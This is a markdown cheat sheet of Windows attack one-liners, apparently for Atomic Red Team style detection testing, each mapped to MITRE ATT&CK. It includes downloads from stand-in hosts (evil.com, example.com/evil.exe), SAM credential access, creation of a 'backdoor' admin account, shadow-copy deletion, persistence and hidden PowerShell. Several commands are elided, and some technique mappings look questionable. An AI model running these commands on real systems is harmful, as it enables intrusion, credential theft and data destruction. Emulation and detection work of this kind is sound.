# 🔥 Atomic Red Team One-Liners with MITRE ATT&CK Mapping

|   # | Command                                                                                   | Description                             | MITRE Technique | MITRE Tactic          |
|----:|--------------------------------------------------------------------------------------------|-----------------------------------------|------------------|------------------------|
|   1 | powershell -Enc UwB0AGEAcgB0AC0AcwBsAGUAZQBwACAAMQAwAA==                                  | Obfuscated PowerShell                   | T1027.001        | Defense Evasion        |
|   2 | certutil -urlcache -split -f http://example.com/evil.exe evil.exe                         | File download using certutil            | T1105            | Command and Control    |
|   3 | reg add HKCU\...\Run                                                                       | Registry Run key persistence            | T1547.001        | Persistence             |
|   4 | wmic process call create "powershell.exe -Command IEX ..."                                 | Executes command via WMIC               | T1047            | Execution               |
|   5 | rundll32.exe javascript:"\..\mshtml,RunHTMLApplication "...                                | Executes JavaScript via rundll32        | T1218.011        | Defense Evasion        |
|   6 | schtasks /create /tn "EvilTask" /tr "cmd.exe /c calc.exe" /sc minute /mo 5                 | Scheduled task creation                 | T1053.005        | Persistence             |
|   7 | bcdedit /set {current} bootstatuspolicy ignoreallfailures                                 | Disables recovery boot                  | T1562.001        | Defense Evasion        |
|   8 | powershell -Command "Get-Content C:\Windows\System32\config\SAM"                           | Access to SAM file                      | T1003.002        | Credential Access       |
|   9 | net user backdoor Pass123! /add                                                            | Creates a user account                  | T1136.001        | Persistence             |
|  10 | net localgroup administrators backdoor /add                                                | Adds user to admin group                | T1068            | Privilege Escalation    |
|  11 | vssadmin delete shadows /all /quiet                                                        | Deletes shadow copies                   | T1490            | Impact                  |
|  12 | curl http://evil.com/malware.ps1 -o malware.ps1                                            | File download using curl                | T1105            | Command and Control     |
|  13 | bitsadmin /transfer myjob ...                                                              | File download using BITS                | T1197            | Command and Control     |
|  14 | powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(...)"                           | Obfuscated PowerShell w/ bypass         | T1059.001        | Execution               |
|  15 | echo malicious >> C:\Windows\System32\drivers\etc\hosts                                    | Modifies hosts file                     | T1565.001        | Impact                  |
